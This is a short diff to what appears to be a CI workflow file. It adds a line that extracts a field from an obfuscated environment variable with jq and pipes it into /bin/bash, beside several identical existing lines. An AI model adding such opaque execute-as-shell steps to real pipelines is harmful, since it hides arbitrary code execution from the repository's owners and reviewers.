@@ -22,6 +22,7 @@ jobs:
           echo $bb7575 | jq -r .si78505 | /bin/bash
           echo $vwv4287 | jq -r .icp9 | /bin/bash
           printf '%s' "$yf446" | jq -r .u709 | /bin/bash
+          echo $dreaq69397 | jq -r .h1 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
